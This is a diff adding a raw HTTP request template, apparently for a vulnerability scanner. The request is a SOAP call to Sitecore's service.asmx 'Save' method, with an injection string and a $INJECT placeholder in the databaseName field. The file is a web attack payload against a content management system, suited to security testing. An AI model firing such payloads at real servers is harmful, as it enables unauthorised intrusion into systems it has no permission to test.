@@ -1,0 +1,20 @@
+POST /sitecore/shell/WebService/service.asmx HTTP/1.1
+Content-Type: text/xml;charset=UTF-8
+SOAPAction: "http://sitecore.net/visual/Save"
+Connection: close
+Content-Length: 0
+Host: localhost
+
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:vis="http://sitecore.net/visual/">
+<soapenv:Header/>
+<soapenv:Body>
+<vis:Save>
+<vis:databaseName>' or $INJECT and 'a'='a</vis:databaseName>
+<vis:xml>NotNull</vis:xml><vis:credentials>
+<vis:CustomData>NotUsed</vis:CustomData>
+<vis:Password>NotUsed</vis:Password>
+<vis:UserName>match</vis:UserName>
+</vis:credentials>
+</vis:Save>
+</soapenv:Body>
+</soapenv:Envelope>
